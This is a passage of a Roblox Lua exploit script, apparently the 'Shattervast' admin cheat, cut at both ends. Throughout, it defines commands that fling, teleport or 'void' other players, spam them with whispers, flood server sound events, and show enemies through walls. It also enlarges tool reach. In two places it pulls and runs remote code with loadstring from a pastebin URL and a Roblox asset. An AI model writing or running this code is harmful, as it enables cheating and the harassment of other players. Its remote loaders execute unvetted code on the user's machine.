		local Clone = Character.HumanoidRootPart:Clone()
		Character.HumanoidRootPart:Destroy()
		Clone.Parent = Character
	else
		local Clone = Character.LowerTorso.Root:Clone()
		Character.LowerTorso.Root:Destroy()
		Clone.Parent = Character.LowerTorso
	end
end

walkto = false
walkplr = ""
Commands.walk = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			walkplr = v
			walkto = true
			noclip = true
		end
	end
end

Commands.unwalk = function(args)
	walkto = false
	noclip = false
	LP.Character.Humanoid:MoveTo(LP.Character.HumanoidRootPart.Position)
end

Commands.glitch = function(args)
	if hasTools() == false then
		Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
	else
		FEGodmode()
		for i,v in pairs(LP.Backpack:GetChildren())do
			LP.Character.Humanoid:EquipTool(v)
		end
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				local function tp(player,player2)
				local char1,char2=player.Character,player2.Character
				if char1 and char2 then
				char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
				end
				end
				tp(game:GetService("Players")[v.Name], LP)
				wait(0.2)
				tp(game:GetService("Players")[v.Name], LP)
				wait(0.5)
				local b = Instance.new("BodyForce")
				b.Parent = LP.Character.HumanoidRootPart
				b.Name = "Glitch"
				if args[2] then
					b.Force = Vector3.new(args[2],5000,0)
				else
					b.Force = Vector3.new(100000000,5000,0)
				end
				wait(6)
				b:Destroy()
			end
		end
	end
end

Commands.tp = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			if v == LP then
				if args[2] then
					for i,a in pairs(findSinglePlayer(args[2])) do
						v.Character.HumanoidRootPart.CFrame = a.Character.HumanoidRootPart.CFrame
					end
				end
			else
				if hasTools() == false then
					Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
				else
					FEGodmode()
					for i,v in pairs(LP.Backpack:GetChildren())do
						LP.Character.Humanoid:EquipTool(v)
					end
					if args[1] then
						for i,first in pairs(findSinglePlayer(args[1])) do
							if args[2] then
								for i,second in pairs(findSinglePlayer(args[2])) do
									local function tp(player,player2)
									local char1,char2=player.Character,player2.Character
									if char1 and char2 then
									char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
									end
									end
									local function getout(player,player2)
									local char1,char2=player.Character,player2.Character
									if char1 and char2 then
									char1:MoveTo(char2.Head.Position)
									end
									end
									tp(LP, first)
									wait(0.2)
									tp(LP, first)
									wait(0.5)
									tp(LP, second)
									wait(0.2)
									tp(LP, second)
									wait(0.2)
									getout(LP, first)
								end
							end
						end
					end
				end
			end
		end
	end
end

Commands.givetool = function(args)
	if args[1] then
		if args[2] then
			local selectedTool = ""
			for i,allTools in pairs(LP.Character:GetDescendants()) do
				if allTools:IsA("Tool") and string.lower(allTools.Name) == string.lower(args[2]) then
					selectedTool = allTools
				else
					for i,otherTools in pairs(LP.Backpack:GetDescendants()) do
						if otherTools:IsA("Tool") and string.lower(otherTools.Name) == string.lower(args[2]) then
							selectedTool = otherTools
						end
					end
				end
			end
			for i,v in pairs(findSinglePlayer(args[1])) do
				if selectedTool ~= "" then
					selectedTool.Parent = v.Character
				end
			end
		else
			for i,plr in pairs(findSinglePlayer(args[1])) do
				for i,tool in pairs(LP.Character:GetDescendants()) do
					if tool:IsA("Tool") then
						tool.Parent = plr.Character
					end
				end
			end
		end
	end
end

Commands.givealltools = function(args)
	LP.Character.Humanoid:UnequipTools()
	for i,plr in pairs(findSinglePlayer(args[1])) do
		for i,v in pairs(LP.Character:GetDescendants()) do
			if v:IsA("Tool") then
				v.Parent = plr.Character
			end
		end
		for i,a in pairs(LP.Backpack:GetDescendants()) do
			if a:IsA("Tool") then
				a.Parent = plr.Character
			end
		end
	end
end

Commands.blockhats = function(args)
	for i,v in pairs(LP.Character:GetDescendants()) do
		if v:IsA("Accessory") or v:IsA("Hat") then
			for i,mesh in pairs(v:GetDescendants()) do
				if mesh.Name == "Mesh" then
					mesh:Destroy()
				end
			end
		end
	end
end

Commands.blocktool = function(args)
	for i,v in pairs(LP.Character:GetDescendants()) do
		if v:IsA("Tool") then
			for i,mesh in pairs(v:GetDescendants()) do
				if mesh.Name == "Mesh" then
					mesh:Destroy()
				end
			end
		end
	end
end

Commands.orbit = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			view(v)
			RocketPropulsion(5000,100,5000,v,"OrbitMove")
		end
	else
		Notification("warning", "No player selected to orbit! Use: "..commandPrefix.."orbit player", 4)
	end
end

Commands.unorbit = function(args)
	for i,v in pairs(LP.Character:GetDescendants()) do
		if v.Name == "OrbitMove" then
			v:Destroy()
		end
	end
	view(LP)
end

Commands.pos = function(args)
	Notification("info", "Your current position is ".. tostring(LP.Character.HumanoidRootPart.Position), 9)
end

SavedPosition = ""
Commands.savepos = function(args)
	SavedPosition = LP.Character.HumanoidRootPart.CFrame
end
Commands.loadpos = function(args)
	if SavedPosition ~= "" then
		LP.Character.HumanoidRootPart.CFrame = SavedPosition
	end
end

Commands.tppos = function(args)
	if args[1] and args[2] and args[3] then
		LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(args[1], args[2], args[3]))
	end
end

Commands.pmspam = function(args)
	if args[1] then
		local gotPlayer = ""
		for i,v in pairs(findPlayer(args[1])) do
			gotPlayer = v
		end
		table.remove(args, 1)
		local pmSpamMsg = table.concat(args," ")
		spamtext = "/w "..gotPlayer.Name.." "..pmSpamMsg
		spamming = true
	end
end

Commands.unpmspam = function(args)
	spamming = false
end

Commands.wsvis = function(args)
	if args[1] then
		for i,v in pairs(gsWorkspace:GetDescendants()) do
			if v:IsA("Part") or v:IsA("Decal") then
				if tonumber(args[1]) > 1 then
					v.Transparency = 0.5
				else
					v.Transparency = args[1]
				end
			end
		end
	end
	clientSided()
end

Commands.bringobj = function(args)
	if args[1] then
		local Object = ""
		for i,v in pairs(gsWorkspace:GetDescendants()) do
			if string.lower(v.Name) == string.lower(args[1]) then
				Object = v				
			end
		end
		if Object == "" then
			Notification("warning", "Object was not found in the workspace.", 6)
		end
		if args[2] then
			Object.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * args[2]
		else
			Object.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * 3
		end
		clientSided()
	end
end

CBRINGplr = ""
cbringing = false
cbringingall = false
Commands.cbring = function(args)
	if args[1] then
		if string.lower(tostring(args[1])) == "all" or string.lower(tostring(args[1])) == "others" then
			cbringingall = true
		else
			for i,v in pairs(findPlayer(args[1])) do
				CBRINGplr = v
				cbringing = true
			end
		end
		if args[2] then
			CBRINGamount = args[2]
		else
			CBRINGamount = 3
		end
		clientSided()
	end
end

Commands.uncbring = function(args)
	cbringing = false
	cbringingall = false
end

Commands.cfreeze = function(args)
	if args[1] then
		for i,v in pairs(findPlayer(args[1])) do
			v.Character.HumanoidRootPart.Anchored = true
		end
		clientSided()
	end
end

Commands.uncfreeze = function(args)
	if args[1] then
		for i,v in pairs(findPlayer(args[1])) do
			v.Character.HumanoidRootPart.Anchored = false
		end
	else
		for i,all in pairs(gsPlayers:GetPlayers()) do
			all.Character.HumanoidRootPart.Anchored = false
		end
	end
end

Commands.unattach = function(args)
	local function getout(player,player2)
	local char1,char2=player.Character,player2.Character
	if char1 and char2 then
	char1:MoveTo(char2.Head.Position)
	end
	end
	getout(LP, LP)
end

currentToolSize = ""
Commands.reach = function(args)
	if args[1] then
		for i,v in pairs(LP.Character:GetDescendants()) do
			if v:IsA("Tool") then
				if string.lower(tostring(args[1])) == "off" then
					v.Handle.Size = currentToolSize
					v.Handle.SelectionBoxCreated:Destroy()
					LP.Character.Humanoid:UnequipTools()
				elseif string.lower(tostring(args[1])) == "on" then
					if args[2] then
						currentToolSize = v.Handle.Size
						local a = Instance.new("SelectionBox",v.Handle)
						a.Name = "SelectionBoxCreated"
						a.Adornee = v.Handle
						v.Handle.Size = Vector3.new(0.5,0.5,args[2])
						v.GripPos = Vector3.new(0,0,0)
						LP.Character.Humanoid:UnequipTools()
					else
						currentToolSize = v.Handle.Size
						local a = Instance.new("SelectionBox",v.Handle)
						a.Name = "SelectionBoxCreated"
						a.Adornee = v.Handle
						v.Handle.Size = Vector3.new(0.5,0.5,60)
						v.GripPos = Vector3.new(0,0,0)
						LP.Character.Humanoid:UnequipTools()
					end
				end
			end
		end
	end
end

Commands.droptool = function(args)
	for i,v in pairs(LP.Character:GetDescendants()) do
		if v:IsA("Tool") then
			v.Parent = gsWorkspace
		end
	end
	for i,a in pairs(LP.Backpack:GetDescendants()) do
		if a:IsA("Tool") then
			a.Parent = gsWorkspace
		end
	end
end

Commands.drophats = function(args)
	for i,v in pairs(LP.Character:GetDescendants()) do
		if v:IsA("Accessory") or v:IsA("Hat") then
			v.Parent = gsWorkspace
		end
	end
end

Commands.hidecmdbar = function(args)
	CMDBAR.Visible = false
end

Commands.showcmdbar = function(args)
	CMDBAR.Visible = true
end

Commands.prefix = function(args)
	if args[1] then
		commandPrefix = string.sub(tostring(args[1]), 1, 1)
		fullUpdate()
	end
end

Commands.removeinvis = function(args)
	for i,v in pairs(gsWorkspace:GetDescendants()) do
		if v:IsA("Part") and v.Name ~= "HumanoidRootPart" then
			if v.Transparency == 1 then
				v:Destroy()
			end
		end
	end
	clientSided()
end

Commands.removefog = function(args)
	gsLighting.FogStart = 0
	gsLighting.FogEnd = 9999999999999
	clientSided()
end

Commands.animation = function(args)
	if args[1] then
		if string.lower(tostring(args[1])) == "gui" then
			loadstring(game:HttpGet(("https://pastebin.com/raw/mdbTSP4d"),true))()
		else
			local Anim = Instance.new("Animation")
			Anim.AnimationId = "rbxassetid://".. tostring(args[1])
			local track = LP.Character.Humanoid:LoadAnimation(Anim)
			if args[2] then
				track:Play(.1, 1, args[2])
			else
				track:Play(.1, 1, 1)
			end
		end
	end
end

Commands.btools = function(args)
	local Clone_T = Instance.new("HopperBin",LP.Backpack)
	Clone_T.BinType = "Clone"
	local Destruct = Instance.new("HopperBin",LP.Backpack)
	Destruct.BinType = "Hammer"
	local Hold_T = Instance.new("HopperBin",LP.Backpack)
	Hold_T.BinType = "Grab"
	clientSided()
end

Commands.esp = function(args)
	if args[1] then
		for i,v in pairs(findPlayer(args[1])) do
			local espPlayer = v
			for i,createESP in pairs(espPlayer.Character:GetDescendants()) do
				if createESP:IsA("Part") or createESP:IsA("MeshPart") then
					if createESP.Name ~= "HumanoidRootPart" and createESP.Name ~= "Handle" then
						local current = true
						local espBOX = Instance.new("BoxHandleAdornment")
						espBOX.Parent = game.Players.LocalPlayer.PlayerGui
						espBOX.Name = "rGET"..espPlayer.Name
						espBOX.Adornee = createESP
						espBOX.AlwaysOnTop = true
						espBOX.ZIndex = 0
						espBOX.Size = createESP.Size
						espBOX.Transparency = 0.3
						local AboveHead = Instance.new("BillboardGui")
						AboveHead.Parent = game.Players.LocalPlayer.PlayerGui
						AboveHead.Adornee = espPlayer.Character.Head
						AboveHead.Name = "rGET"..espPlayer.Name
						AboveHead.Size = UDim2.new(0, 100, 0, 100)
						AboveHead.StudsOffset = Vector3.new(0, 1, 0)
						AboveHead.AlwaysOnTop = true
						local Info = Instance.new("TextLabel")
						Info.Parent = AboveHead
						Info.BackgroundTransparency = 1
						Info.Position = UDim2.new(0, 0, 0, 0)
						Info.Size = UDim2.new(1, 0, 0, 40)
						Info.TextColor3 = Color3.fromRGB(200,200,200)
						Info.TextStrokeTransparency = 0.5
						Info.TextSize = 15
						if espPlayer.TeamColor == LP.TeamColor then
							espBOX.Color = BrickColor.new("Lime green")
							Info.TextStrokeColor3 = Color3.fromRGB(10,100,10)
						else
							espBOX.Color = BrickColor.new("Really red")
							Info.TextStrokeColor3 = Color3.fromRGB(100,10,10)
						end
						game:GetService('RunService').Stepped:connect(function()
							if current and LP.Character.Humanoid and espPlayer.Character.HumanoidRootPart then
								Info.Text = espPlayer.Name.." (".. math.floor((LP.Character.HumanoidRootPart.Position - espPlayer.Character.HumanoidRootPart.Position).magnitude)..")"
							end
						end)
						espPlayer.Character.Humanoid.Died:Connect(function()
							current = false
							espBOX:Destroy()
							AboveHead:Destroy()
						end)
						gsPlayers.PlayerRemoving:Connect(function(plr)
							if plr == espPlayer then
								current = false
								espBOX:Destroy()
								AboveHead:Destroy()
							end
						end)
					end
				end
			end
		end
		clientSided()
	end
end

Commands.unesp = function(args)
	if not args[1] then
		for i,v in pairs(gsCoreGui:GetDescendants()) do
			if string.sub(v.Name, 1, 4) == "rGET" then
				v:Destroy()
			end
		end
	else
		for i,v in pairs(gsCoreGui:GetDescendants()) do
			if string.sub(v.Name, 1, 4) == "rGET" then
				for i,a in pairs(findPlayer(args[1])) do
					if string.sub(v.Name, 5) == a.Name then
						v:Destroy()
					end
				end
			end
		end
	end
end

Commands.dice = function(args)
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("You rolled a dice for ".. tostring(math.random(1, 6)), "All")
end

Commands.random = function(args)
	if args[1] and args[2] then
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Picking random number between "..args[1].." and "..args[2].."... The number is ".. tostring(math.random(args[1], args[2])), "All")
	end
end

Commands.closegame = function(args)
	game:Shutdown()
end

Commands.savetool = function(args)
	if args[1] then
		for i,a in pairs(LP.Character:GetDescendants()) do
			if a:IsA("Tool") and string.lower(a.Name) == string.lower(tostring(args[1])) then
				a.Parent = LP
				local oldName = a.Name
				a.Name = "saved "..oldName
			else
				for i,n in pairs(LP.Backpack:GetDescendants()) do
					if n:IsA("Tool") and string.lower(n.Name) == string.lower(tostring(args[1])) then
						n.Parent = LP
						local sOldName = n.Name
						n.Name = "saved "..sOldName
					end
				end
			end
		end
	else
		for i,v in pairs(LP.Character:GetDescendants()) do
			if v:IsA("Tool") then
				v.Parent = LP
				local oldName = v.Name
				v.Name = "saved "..oldName
			end
		end
	end
end

Commands.loadtool = function(args)
	if args[1] then
		for i,a in pairs(LP:GetChildren()) do
			if a:IsA("Tool") and string.sub(a.Name, 1, 5) == "saved" and string.lower(string.sub(a.Name, 7)) == string.lower(tostring(args[1])) then
				a.Parent = LP.Backpack
				local currentName = a.Name
				a.Name = string.sub(currentName, 7)
			end
		end
	else
		for i,v in pairs(LP:GetChildren()) do
			if string.sub(v.Name, 1, 5) == "saved" then
				v.Parent = LP.Backpack
				local currentName = v.Name
				v.Name = string.sub(currentName, 7)
			end
		end
	end
end

Commands.savealltool = function(args)
	for i,v in pairs(LP.Character:GetDescendants()) do
		if v:IsA("Tool") then
			v.Parent = LP
			local oldName = v.Name
			v.Name = "saved "..oldName
		end
	end
	for i,v in pairs(LP.Backpack:GetDescendants()) do
		if v:IsA("Tool") then
			v.Parent = LP
			local oldName = v.Name
			v.Name = "saved "..oldName
		end
	end
end

Commands.loadalltool = function(args)
	for i,v in pairs(LP:GetChildren()) do
		if v:IsA("Tool") and string.sub(v.Name, 1, 5) == "saved" then
			v.Parent = LP.Backpack
			local currentName = v.Name
			v.Name = string.sub(currentName, 7)
		end
	end
end

Mouse.KeyDown:Connect(function(key) 
	if key == clicktpKEY and clicktpACTIVE == true then 
		if Mouse.Target then 
			LP.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.x, Mouse.Hit.y + 5, Mouse.Hit.z)
		end 
	end
	if key == clickdelKEY and clickdelACTIVE == true then 
		if Mouse.Target then 
			Mouse.Target:Destroy()
		end 
	end
end)
Mouse.Button1Down:Connect(function()
	if clicktpACTIVE == true and clicktpCLICK == true then
		if Mouse.Target then 
			LP.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.x, Mouse.Hit.y + 5, Mouse.Hit.z)
		end 
	end
	if clickdelACTIVE == true and clickdelCLICK == true then
		if Mouse.Target then
			Mouse.Target:Destroy()
		end
	end
end)

clicktpKEY = ""
clickdelKEY = ""
clicktpACTIVE = false
clickdelACTIVE = false
clicktpCLICK = false
clickdelCLICK = false

Commands.clicktp = function(args)
	if args[1] then
		clicktpKEY = string.sub(tostring(args[1]), 1, 1)
		clicktpACTIVE = true
		clicktpCLICK = false
	else
		clicktpKEY = ""
		clicktpACTIVE = true
		clicktpCLICK = true
	end
	clientSided()
end

Commands.clickdel = function(args)
	if args[1] then
		clickdelKEY = string.sub(tostring(args[1]), 1, 1)
		clickdelACTIVE = true
		clickdelCLICK = false
	else
		clickdelKEY = ""
		clickdelACTIVE = true
		clickdelCLICK = true
	end
	clientSided()
end

Commands.unclicktp = function(args)
	clicktpACTIVE = false
end

Commands.unclickdel = function(args)
	clickdelACTIVE = false
end

Commands.oof = function(args)
	spawn(function()
		while wait() do
		   for i,v in pairs(game:GetService'Players':GetPlayers()) do
		       if v.Character ~= nil and v.Character:FindFirstChild'Head' then
		           for _,x in pairs(v.Character.Head:GetChildren()) do
		               if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true) end
		           end
		       end
		   end
		end
	end)
end

Commands.chatlogs = function(args)
	MainChatFrame.Position = UDim2.new(0, 760, 0, 261)
	MainChatFrame.Visible = true
end

Commands.stopadmin = function(args)
	commandPrefix = "     "
	following = false
	trailing = false
	annoying = false
	CMDBAR.Visible = false
	Match.Visible = false
	flying = false
end

Commands.freecam = function(args)
	for i,getFC in pairs(gsWorkspace:GetDescendants()) do
		if getFC.Name == "rGETpartNUMBER2" then
			getFC:Destroy()
		end
	end
	local CameraPart = Instance.new("Part")
	CameraPart.CanCollide = false
	CameraPart.CFrame = LP.Character.Head.CFrame
	CameraPart.Locked = true
	CameraPart.Transparency = 1
	CameraPart.Size = Vector3.new(1, 1, 1)
	CameraPart.Parent = gsWorkspace
	CameraPart.Name = "rGETpartNUMBER2"
	if bypassMODE == true then
		loopviewfc = true
	elseif bypassMODE == false then
		gsWorkspace.CurrentCamera.CameraSubject = CameraPart
	end
	local speedget = 1
	local T = CameraPart
	local CONTROL = {F = 0, B = 0, L = 0, R = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
	local SPEED = speedget
	if args[1] then
		speedfly = tonumber(args[1])
	else
		speedfly = 1
	end
	local function freecamfly()
		LP.Character.Head.Anchored = true
		doFREECAM = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0.1, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
		repeat wait()
		if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
		SPEED = 50
		elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
		SPEED = 0
		end
		if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
		BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
		lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
		elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
		BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
		else
		BV.velocity = Vector3.new(0, 0.1, 0)
		end
		BG.cframe = workspace.CurrentCamera.CoordinateFrame
				until not doFREECAM
				CONTROL = {F = 0, B = 0, L = 0, R = 0}
				lCONTROL = {F = 0, B = 0, L = 0, R = 0}
				SPEED = 0
				BG:destroy()
				BV:destroy()
			end)
		end
	Mouse.KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = speedfly
		elseif KEY:lower() == 's' then
			CONTROL.B = -speedfly
		elseif KEY:lower() == 'a' then
			CONTROL.L = -speedfly 
		elseif KEY:lower() == 'd' then 
			CONTROL.R = speedfly
		end
	end)
	Mouse.KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		end
	end)
	freecamfly()
end

Commands.fc = function(args)
	if args[1] then
		run(commandPrefix.."freecam "..args[1])
	else
		run(commandPrefix.."freecam")
	end
end

Commands.unfreecam = function(args)
	doFREECAM = false
	LP.Character.Head.Anchored = false
	view(LP)
	if gsWorkspace.rGETpartNUMBER2 then
		gsWorkspace.rGETpartNUMBER2:Destroy()
	end
	loopviewfc = false
end

Commands.unfc = function(args)
	doFREECAM = false
	LP.Character.Head.Anchored = false
	view(LP)
	if gsWorkspace.rGETpartNUMBER2 then
		gsWorkspace.rGETpartNUMBER2:Destroy()
	end
	loopviewfc = false
end

Commands.gotofc = function(args)
	doFREECAM = false
	LP.Character.Head.Anchored = false
	view(LP)
	pcall(function()
		LP.Character.HumanoidRootPart.CFrame = gsWorkspace.rGETpartNUMBER2.CFrame
		gsWorkspace.rGETpartNUMBER2:Destroy()
	end)
	loopviewfc = false
end

Commands.fctp = function(args)
	if args[1] then
		for i,v in pairs(findPlayer(args[1])) do
			pcall(function()
				gsWorkspace.rGETpartNUMBER2.CFrame = v.Character.Head.CFrame
			end)
		end
	end
end

Commands.cmds = function(args)
	CMDSmain.Position = UDim2.new(0, 695, 0, 297)
	CMDSmain.Visible = true
	CMDSmain:TweenSize(UDim2.new(0, 440, 0, 367), "InOut", "Sine", 1)
end

Commands.fullcredits = function(args)
	Notification("info", "Credit to Autumn, Josh and 3dsboy08 (Help with "..commandPrefix.."remotespy and anti client kick)", 1)
	Notification("info", "Credit to Infinite Yield developers (Assisted in "..commandPrefix.."esp and "..commandPrefix.."fly commands)", 1)
	Notification("info", "Credit to Timeless ("..commandPrefix.."invisible) and Harkinian ("..commandPrefix.."shutdown)", 1)
	Notification("info", "Credit to DEX creators ("..commandPrefix.."explorer) and xFunnieuss ("..commandPrefix.."spinhats)", 1)
	Notification("info", "Only creator is illremember", 2)
end

Commands.hotkey = function(args)
	if args[1] then
		local hotkeyKEY = string.sub(tostring(args[1]), 1, 3)
		if args[2] then
			table.remove(args, 1)
			local hotkeyCMD = table.concat(args, " ")
			table.insert(hotkeys, hotkeyCMD.."//"..hotkeyKEY)
			fullUpdate()
			Notification("info", "Hotkey added!", 1)
		end
	end
end

Mouse.KeyDown:Connect(function(key)
	for i,v in pairs(hotkeys) do
		local currentKey = string.match(v, "[%a%d]+$")
		if string.len(currentKey) == 1 then
			if key == string.sub(v, #v, #v) then
				local commandtoRUN = string.match(v, "^[%w%s]+")
				if string.sub(string.lower(tostring(commandtoRUN)), 1, 3) == "fly" then
					if bypassMODE == true then
						if doFREECAM == false then
							run(commandPrefix..tostring(commandtoRUN))
						else
							run(commandPrefix.."unfly")
						end
					else
						if flying == false then
							run(commandPrefix..tostring(commandtoRUN))
						else
							run(commandPrefix.."unfly")
						end
					end
				elseif tostring(commandtoRUN) == "noclip" then
					if noclip == false then
						run(commandPrefix..tostring(commandtoRUN))
					else
						run(commandPrefix.."clip")
					end
				elseif tostring(commandtoRUN) == "freecam" or tostring(commandtoRUN) == "fc" then
					if doFREECAM == false then
						run(commandPrefix..tostring(commandtoRUN))
					else
						if fchotkeymode == "goto" then
							run(commandPrefix.."gotofc")
						elseif fchotkeymode == "unfc" then
							run(commandPrefix.."unfreecam")
						end
					end
				else
					run(commandPrefix..tostring(commandtoRUN))
				end
			end
		else
			if string.lower(string.sub(tostring(currentKey), 1, 1)) == "f" then
				local commandtoRUN = string.match(v, "^[%w%s]+")
				local hotkeyadjust = tonumber(string.sub(currentKey, 2, 3)) + 25
				if string.byte(key) == hotkeyadjust then
					if string.sub(string.lower(tostring(commandtoRUN)), 1, 3) == "fly" then
						if bypassMODE == true then
							if doFREECAM == false then
								run(commandPrefix..tostring(commandtoRUN))
							else
								run(commandPrefix.."unfly")
							end
						else
							if flying == false then
								run(commandPrefix..tostring(commandtoRUN))
							else
								run(commandPrefix.."unfly")
							end
						end
					elseif tostring(commandtoRUN) == "noclip" then
						if noclip == false then
							run(commandPrefix..tostring(commandtoRUN))
						else
							run(commandPrefix.."clip")
						end
					elseif tostring(commandtoRUN) == "freecam" or tostring(commandtoRUN) == "fc" then
						if doFREECAM == false then
							run(commandPrefix..tostring(commandtoRUN))
						else
							if fchotkeymode == "goto" then
								run(commandPrefix.."gotofc")
							elseif fchotkeymode == "unfc" then
								run(commandPrefix.."unfreecam")
							end
						end
					else
						run(commandPrefix..tostring(commandtoRUN))
					end
				end
			end
		end
	end
end)

Commands.removeallhotkey = function(args)
	hotkeys = {}
	fullUpdate()
	Notification("warning", "All hotkeys reset/removed", 6)
end

Commands.removehotkey = function(args)
	if args[1] then
		for i,v in pairs(hotkeys) do
			local currentKey = string.match(v, "[%a%d]+$")
			if currentKey == string.lower(tostring(args[1])) then
				table.remove(hotkeys, i)
				fullUpdate()
			end
		end
	end
end

Commands.printhotkeys = function(args)
	for i,v in pairs(hotkeys) do
		warn("HOTKEYS:")
		print(v)
	end
end

Commands.os = function(args)
	if args[1] then
		for i,v in pairs(findPlayer(args[1])) do
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." is on "..v.OsPlatform, "All")
		end
	end
end

spinning = false
Commands.spin = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			run(commandPrefix.."attach "..v.Name)
			annplr = v
			annoying = true
			spinning = true
		end
	end
end

Commands.unspin = function(args)
	if spinning then
		annoying = false
		spinning = false
	end
	run(""..commandPrefix.."unattach")
end

Commands.explorer = function(args)
	loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)()
	Notification("info", "Loaded DEX explorer!", 5)
end

Commands.maxzoom = function(args)
	if args[1] then
		LP.CameraMaxZoomDistance = args[1]
	end
end

Commands.stare = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			stareplr = v
			staring = true
		end
	end
end

Commands.unstare = function(args)
	staring = false
end

Commands.tempgod = function(args)
	local hu = LP.Character.Humanoid
	local l = Instance.new("Humanoid")
	l.Parent = LP.Character
	l.Name = "Humanoid"
	wait(0.1)
	hu.Parent = LP
	gsWorkspace.CurrentCamera.CameraSubject = LP.Character
	LP.Character.Animate.Disabled = true
	wait(0.1)
	LP.Character.Animate.Disabled = false
	Notification("info", "Enabled Temp FE Godmode", 4)
end

Commands.void = function(args)
	if hasTools() == false then
		Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
	else
		FEGodmode()
		for i,v in pairs(LP.Backpack:GetChildren())do
			LP.Character.Humanoid:EquipTool(v)
		end
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				local NOW = LP.Character.HumanoidRootPart.CFrame
				LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
				wait(0.3)
				LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
				local function tp(player,player2)
				local char1,char2=player.Character,player2.Character
				if char1 and char2 then
				char1:MoveTo(char2.Head.Position)
				end
				end
				wait(0.5)
				LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(999999999999999,0,999999999999999))
			end
		end
	end
end

Commands.freefall = function(args)
	if hasTools() == false then
		Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
	else
		FEGodmode()
		for i,v in pairs(LP.Backpack:GetChildren())do
			LP.Character.Humanoid:EquipTool(v)
		end
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				local NOW = LP.Character.HumanoidRootPart.CFrame
				LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
				wait(0.3)
				LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
				wait(0.5)
				LP.Character.HumanoidRootPart.CFrame = NOW
				wait(0.5)
				LP.Character.HumanoidRootPart.CFrame = NOW
				wait(0.6)
				LP.Character.HumanoidRootPart.CFrame = CFrame.new(0,50000,0)
			end
		end
	end
end

Commands.version = function(args)
	Notification("info", "Current Shattervast Version: V2.8", 7)
end

Commands.shiftlockon = function(args)
	LP.DevEnableMouseLock = true
	Notification("info", "Shift lock enabled!", 5)
end

for i,needChat in pairs(gsPlayers:GetPlayers()) do
	needChat.Chatted:Connect(function(msg)
		if copychatall then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
		end
	end)
end
gsPlayers.PlayerAdded:Connect(function(plr)
	plr.Chatted:Connect(function(msg)
